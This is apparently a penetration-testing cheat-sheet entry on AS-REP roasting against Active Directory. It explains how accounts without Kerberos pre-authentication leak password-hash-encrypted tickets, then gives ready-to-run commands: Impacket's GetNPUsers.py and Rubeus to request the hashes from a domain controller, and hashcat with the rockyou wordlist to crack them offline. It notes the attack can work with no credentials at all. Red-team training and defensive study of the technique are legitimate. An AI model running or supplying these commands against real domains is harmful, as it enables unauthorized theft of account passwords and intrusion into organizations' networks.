**Some accounts have "Kerberos pre-authentication" switched off.** For those, you can ask the DC for a login ticket _without proving who you are first_ — and that ticket is encrypted with the account's password hash. Grab it, crack it offline with hashcat, and you have a real password. **Prerequisite:** an account with pre-auth disabled (BloodHound → "Find AS-REP Roastable Users"). It can even work with _no creds_ if you can guess valid usernames.

```
GetNPUsers.py corp.local/stephanie:'Password123' \
    -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt

# Windows (Rubeus):
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```